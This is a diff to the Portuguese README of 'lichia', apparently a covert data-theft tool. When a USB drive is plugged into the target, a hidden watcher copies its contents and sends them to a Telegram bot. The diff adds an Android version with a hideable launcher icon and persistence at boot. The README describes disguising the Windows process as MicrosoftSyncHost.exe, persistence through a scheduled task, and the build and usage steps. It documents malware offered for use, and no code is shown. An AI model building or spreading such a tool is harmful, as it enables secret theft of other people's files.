@@ -1,10 +1,17 @@
 # lichia
 
 Exfiltração discreta via pendrive: um pendrive "armadilha" fica escondido;
-quando outro pendrive é encaixado no mesmo PC, o conteúdo dele é copiado,
-empacotado e enviado para um bot do Telegram.
+quando outro pendrive é encaixado, o conteúdo dele é copiado, empacotado e
+enviado para um bot do Telegram. Versões: desktop (Windows) e mobile (Android).
 
-## arquitetura
+- **Desktop (Windows):** GUI Tkinter programa o pendrive armadilha; watcher
+  oculto no PC detecta novo disco removível e exfiltra.
+- **Mobile (Android):** app `br.com.lichia.app` com watcher em foreground
+  service que detecta pendrive via OTG (`/storage/XXXX-XXXX`), copia tudo,
+  compacta e envia ao Telegram. Sem launcher obrigatório (alias ocultável),
+  persistência via BOOT_COMPLETED.
+
+## arquitetura (desktop)
 
 ```
 gui/lichia_gui.py        GUI (Tkinter, tema lichia) — programa o pendrive
@@ -48,9 +55,35 @@ Ou use o botão "gerar payload.exe" na GUI.
 - sempre ignora `System Volume Information`, `$RECYCLE.BIN`, o próprio pendrive
   da lichia e o cache de staging.
 
+## mobile (Android — `app-mobile/`)
+
+```
+app-mobile/app/src/main/java/br/com/lichia/app/
+  MainActivity.kt     config (token, chat id, modo) + esconder ícone
+  LichiaService.kt    foreground service, varre /storage a cada 3s, exfil via OTG
+  TgClient.kt         sendDocument multipart + chunks de 49MB
+  Collect.kt          walk + filtros (tudo / docs / max_mb)
+  BootReceiver.kt     reinicia o service no boot
+```
+
+Uso:
+1. Instale o APK, abra, preencha token + chat id, "conceder acesso a arquivos"
+   (All files access), "salvar e ativar watcher".
+2. "esconder ícone" remove o launcher; reabre por Ajustes → Apps → Lichia → Abrir.
+3. Pendrive encaixado via OTG → copia tudo e manda pro bot.
+
+Build local:
+```
+cd app-mobile
+gradle assembleDebug
+```
+Ou o GitHub Actions workflow `.github/workflows/android.yml` compila o APK no
+push e publica como artifact (`lichia-apk`).
+
 ## notas
 
 - `.py` direto não serve para instalação — o payload precisa ser compilado
   (PyInstaller) para que `sys.executable` aponte para ele mesmo no pendrive.
 - A tarefa agendada se chama `Lichia`; o processo fica como `MicrosoftSyncHost.exe`.
 - Sem criptografia de config — trate o token do bot como dado sensível.
+- Android 11+: "All files access" é obrigatório para varrer o OTG.
